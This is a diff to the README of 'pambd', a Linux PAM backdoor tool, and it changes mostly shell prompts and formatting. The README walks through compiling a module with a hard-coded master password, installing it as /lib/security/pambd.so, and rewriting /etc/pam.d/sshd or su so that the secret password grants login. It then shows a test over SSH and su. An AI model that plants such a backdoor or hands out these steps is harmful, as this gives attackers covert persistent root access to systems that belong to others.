@@ -21,7 +21,7 @@ If you get the error:
 
 First install the package **libpam-dev** that contains the needed headers file for compilation:
 
-    sudo apt-get install libpam0g-dev
+    deftcode pambd $ sudo apt-get install libpam0g-dev
 
 Now edit the **pambd.c** and set your master custom password:
 
@@ -30,15 +30,15 @@ Now edit the **pambd.c** and set your master custom password:
 After that, generate the pam backdoor with:
 (It needs the root permissions)
 
-    deftcode ~ $ sudo sh gen.sh
+    deftcode pambd $ sudo sh gen.sh
 
-This will generate the pam backdoor at /lib/security/pambd.so
+This will generate the pam backdoor at **/lib/security/pambd.so**.
 
 
 Configure the PAM service you want to hijack
 --------------------------------------------
 
-Edit the **/etc/pam.d/sshd** or others that use PAM like **su** and then replace the content with these lines:
+Edit the **/etc/pam.d/sshd** or other that use PAM like **/etc/pam.d/su** and then replace the content with these lines:
 
     nauth           sufficient      pam_rootok.so
     auth            sufficient      pam_unix.so     # This must be 'sufficient'.
@@ -53,12 +53,12 @@ Test the backdoor
 
 After you have created the pambd backdoor, you can test It.
 
-    deftcode pam.d $ file /lib/security/pambd.so 
+    deftcode pambd $ file /lib/security/pambd.so 
     /lib/security/pambd.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
 
 Example with the **SSH** service:
 
-    deftcode pam.d $ ssh eurialo@deftcode.local
+    deftcode pambd $ ssh eurialo@deftcode.local
     eurialo@deftcode.local's password: 
     
     # eg. enter: my_master_passwd or real_user_password
@@ -68,7 +68,7 @@ Example with the **SSH** service:
 
 Example with **su**:
 
-    deftcode pam.d $ su -
+    deftcode pambd $ su -
     Password: 
 
     # eg. enter: my_master_passwd or real_user_password
